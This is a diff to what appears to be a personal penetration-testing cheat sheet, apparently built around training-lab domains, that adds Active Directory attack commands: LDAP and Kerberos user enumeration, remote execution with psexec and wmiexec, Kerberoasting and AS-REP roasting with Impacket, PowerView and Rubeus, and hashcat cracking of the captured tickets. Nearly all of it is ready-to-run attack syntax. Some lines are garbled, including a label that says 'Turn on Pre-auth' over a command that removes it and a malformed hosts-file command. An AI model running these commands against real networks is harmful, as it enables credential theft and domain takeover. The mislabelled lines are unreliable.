@@ -543,6 +543,7 @@ sudo responder -I ens224 -A
 
 # User Enumeration
     - Linux
+        ldapsearch -H ldap://DC_IP -x -b "DC=hutch,DC=offsec" > ldap.txt
         kerbrute userenum -d DOMAIN_NAME --dc DC_IP username_wordlist.txt -o valid_ad_users
         enum4linux -U IP | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
         rpcclient -U "" -N IP
@@ -596,4 +597,48 @@ sudo responder -I ens224 -A
 
 ### Exploit
 ```c
+# Connect from Linux
+    xfreerdp /v:IP /u:USER /p:PASS
+    psexec.py inlanefreight.local/USER:'PASS'@IP
+    wmiexec.py inlanefreight.local/USER:'PASS'@IP
+
+# Kerberoast
+    ## Linux
+        List SPNs:  GetUserSPNs.py -dc-ip DC_IP INLANEFREIGHT.LOCAL/USER
+        Request TGS
+            All:  GetUserSPNs.py -dc-ip DC_IP INLANEFREIGHT.LOCAL/USER -request -outputfile all_tgs
+            Single:  GetUserSPNs.py -dc-ip DC_IP INLANEFREIGHT.LOCAL/USER -request-user username -outputfile username_tgs
+        Crack:  hashcat -m 13100 tgs /usr/share/wordlists/rockyou.txt
+        Test creds:  sudo crackmapexec smb IP -u USER -p PASS
+
+    ## Windows
+        Powerview
+            Import-Module .\PowerView.ps1  ->  Get-DomainUser * -spn | select samaccountname
+            Target single user:  Get-DomainUser -Identity SAM | Get-DomainSPNTicket -Format Hashcat
+            Target all users:  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
+        Rubeus
+            .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+            .\Rubeus.exe kerberoast /user:USER /nowrap
+            Check encryption
+                Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+                If it says 0 or 23 then RC4 encryption: hashcat -m 1000 hash rockyou.txt
+                If it says 17, 18, 24:  hashcat -m 19700 hash rockyou.txt
+    ## Attacks
+        AS-REQ/ AS-REP Roast  -  pre-authentication must be disabled
+            Windows
+                Turn on Pre-auth:  Import-Module .\PowerView.ps1  >  Set-DomainObject -Identity USER -XOR @{useraccountcontrol=4194304} -Verbose
+                Enumeration
+                    PowerView: Import-Module .\PowerView.ps1  >  Get-DomainUser -UACFilter DONT_REQ_PREAUTH
+                    Rubeus: Rubeus.exe asreproast /format:hashcat
+                Attack
+                    .\Rubeus.exe asreproast /user:USER /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
+                    hashcat.exe -m 18200 C:\Tools\hashes.txt C:\Tools\rockyou.txt -O
+            Linux
+                sudo nano /etc/hosts > DC_IP Domain_name
+                Enumeration
+                    List Users:  GetNPUsers.py inlanefreight.local/username
+                    List of users with a hash:  GetNPUsers.py inlanefreight.local/pixis -request
+                Attack
+                    Find ASREP Roastable accounts:  GetNPUsers.py INLANEFREIGHT/ -dc-ip DC_IP -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/hashes.txt -no-pass
+                    hashcat -m 18200 hashes.txt rockyou.txt
 ```
